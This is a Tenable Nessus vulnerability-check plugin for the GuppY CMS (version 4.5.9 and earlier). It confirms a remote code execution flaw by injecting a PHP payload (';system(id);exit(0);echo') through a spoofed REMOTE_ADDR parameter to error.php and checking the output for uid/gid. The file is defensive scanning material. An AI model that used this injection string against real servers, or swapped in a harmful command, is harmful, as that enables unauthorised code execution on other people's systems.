#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running GuppY, a content management system written
in PHP. 

The version of GuppY installed on the remote host does not sanitize
user input to the server variable 'REMOTE_ADDR' before using it in the
'error.php' script as part of an include script.  An unauthenticated
attacker can leverage this issue to run arbitrary code on the remote
host subject to the privileges of the web server user id. 

In addition, the application reportedly is prone to several local file
include and information disclosure vulnerabilities in scripts used for
administration. 

See also :

http://retrogod.altervista.org/guppy459_xpl.html
http://www.securityfocus.com/archive/1/417899

Solution :

Unknown at this time.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20248);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-3926", "CVE-2005-3927");
  script_bugtraq_id(15609, 15610);

  script_name(english:"GuppY <= 4.5.9 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in GuppY <= 4.5.9");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/guppy", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to run a command.
  cmd = "id";
  req = http_get(
    item:string(
      dir, "/error.php?",
      "err=", SCRIPT_NAME, "&",
      "_SERVER=&",
      '_SERVER[REMOTE_ADDR]=";system(', urlencode(str:cmd), ');exit(0);echo"'
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # Follow the redirect, if it's available.
  url = strstr(res, "location: ");
  if (url) {
    url = url - "location: ";
    url = url - strstr(url, SCRIPT_NAME);
    url += SCRIPT_NAME;
  }
  if (url) {
    req = http_get(item:string(dir, "/", url), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we could run the command.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
        contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");
        if (!strlen(contents)) contents = res;

        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "It was possible to execute the command '", cmd, "' on the remote host,\n",
          "which produces :\n",
          "\n",
          "  ", contents
        );

      security_hole(port:port, data:report);
      exit(0);
    }

    # If we see something like our exploit, PHP's magic quotes is enabled; 
    # other flaws are possible though so report a flaw.
    if (egrep(pattern:'IP address : ";system\\(.+\\);echo"', string:res)) {
      security_hole(port);
      exit(0);
    }
  }
}
